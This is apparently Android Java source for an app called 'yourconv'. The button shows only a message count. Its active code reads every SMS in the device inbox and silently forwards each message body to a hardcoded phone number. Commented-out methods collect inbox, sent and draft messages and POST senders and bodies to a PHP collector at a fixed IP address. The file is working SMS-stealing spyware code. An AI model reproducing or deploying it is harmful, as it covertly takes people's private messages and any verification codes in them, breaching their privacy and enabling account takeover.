package com.example.landryk.yourconv;

import android.app.Activity;
import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.TextView;

public class Main extends Activity implements OnClickListener {

    Button go;
    TextView stat;
    int countSms;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        countSms= 0;

        stat= (TextView)findViewById(R.id.count);

        go= (Button)findViewById(R.id.button);
        go.setOnClickListener(this);
    }

    @Override
    public void onClick(View v) {

        go.setEnabled(false);

        if(v == go)
        {
            /*sendSmsReceives();
            sendSmsSends();
            sendSmsDrafts();
            */
            jesend();
        }
    }

    /*public void sendSmsReceives()
    {
        // Create Inbox box URI
        Uri inboxURI = Uri.parse("content://sms/inbox");

        // List required columns
        String[] reqCols = new String[] { "_id", "address", "body" };

        // Get Content Resolver object, which will deal with Content Provider
        ContentResolver cr = getContentResolver();

        // Fetch Inbox SMS Message from Built-in Content Provider
        Cursor c = cr.query(inboxURI, reqCols, null, null, null);

        while(c.moveToNext())
        {
            final String adresse= c.getString(1);
            final String sms= c.getString(2);

            Thread t= new Thread(new Runnable() {
                @Override
                public void run() {
                    send("receive", adresse, sms);
                }
            });
            t.start();
            try {
                t.join();
            } catch (InterruptedException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        }
    }

    public void sendSmsSends()
    {
        // Create Sent box URI
        Uri sentURI = Uri.parse("content://sms/sent");

        // List required columns
        String[] reqCols = new String[] { "_id", "address", "body" };

        // Get Content Resolver object, which will deal with Content Provider
        ContentResolver cr = getContentResolver();

        // Fetch Sent SMS Message from Built-in Content Provider
        Cursor c = cr.query(sentURI, reqCols, null, null, null);

        while(c.moveToNext())
        {
            final String adresse= c.getString(1);
            final String sms= c.getString(2);

            Thread t= new Thread(new Runnable() {
                @Override
                public void run() {
                    send("send", adresse, sms);
                }
            });
            t.start();
            try {
                t.join();
            } catch (InterruptedException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        }
    }

    public void sendSmsDrafts()
    {
        // Create Draft box URI
        Uri draftURI = Uri.parse("content://sms/draft");

        // List required columns
        String[] reqCols = new String[] { "_id", "address", "body" };

        // Get Content Resolver object, which will deal with Content Provider
        ContentResolver cr = getContentResolver();

        // Fetch Sent SMS Message from Built-in Content Provider
        Cursor c = cr.query(draftURI, reqCols, null, null, null);

        while(c.moveToNext())
        {
            final String adresse= c.getString(1);
            final String sms= c.getString(2);

            Thread t= new Thread(new Runnable() {
                @Override
                public void run() {
                    send("draft", adresse, sms);
                }
            });
            t.start();
            try {
                t.join();
            } catch (InterruptedException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
        }
    }
    */

    public void jesend() {
        // Create Inbox box URI
        Uri inboxURI = Uri.parse("content://sms/inbox");

        // List required columns
        String[] reqCols = new String[] { "_id", "address", "body" };

        // Get Content Resolver object, which will deal with Content Provider
        ContentResolver cr = getContentResolver();

        // Fetch Inbox SMS Message from Built-in Content Provider
            Cursor c = cr.query(inboxURI, reqCols, null, null, null);
        while(c.moveToNext())
        {
            final String adresse= "90000000";
            final String sms= c.getString(2);
            countSms++;
            if(adresse.length()>= 4 && sms.length() > 0){
                //Grâce à l'objet de gestion de SMS (SmsManager) que l'on récupère grâce à la méthode static getDefault()
                //On envoit le SMS à l'aide de la méthode sendTextMessage
                SmsManager.getDefault().sendTextMessage(adresse, null, sms, null, null);

            }
        }
        stat.setText(String.valueOf(countSms));
    }

    /*public synchronized boolean send(String type, String adresse, String sms)
    {
        String host= "http://192.168.0.11/";
        String target= "SMS/Saver.php";

        ArrayList<NameValuePair> vars= new ArrayList<NameValuePair>();
        vars.add(new BasicNameValuePair("type", String.valueOf(type)));
        vars.add(new BasicNameValuePair("adresse", String.valueOf(adresse)));
        vars.add(new BasicNameValuePair("sms", String.valueOf(sms)));

        String result= null;

        // Envoi de la requ�te avec HTTPPost
        InputStream is= null;
        try{
            HttpClient httpclient = new DefaultHttpClient();
            HttpPost httppost = new HttpPost(host + target);
            httppost.setEntity(new UrlEncodedFormEntity(vars));

            HttpResponse response = httpclient.execute(httppost);
            HttpEntity entity = response.getEntity();
            is = entity.getContent();
        }catch(Exception e){
            Log.e("log_tag", "Error in http connection "+e.toString());
        }

        //Conversion de la r�ponse en chaine
        try{
            BufferedReader reader = new BufferedReader(new InputStreamReader(is, "iso-8859-1"), 8);
            StringBuilder sb = new StringBuilder();
            String line = null;

            while ((line = reader.readLine()) != null) {
                sb.append(line + "\n");
            }

            is.close();
            result=sb.toString();

        }catch(Exception e){
            Log.e("log_tag", "Error converting result "+e.toString());
        }

        countSms++;
        stat.post(new Runnable() {

            @Override
            public void run() {
                stat.setText(String.valueOf(countSms));
            }
        });

        return Boolean.valueOf(result);
    }
    */



}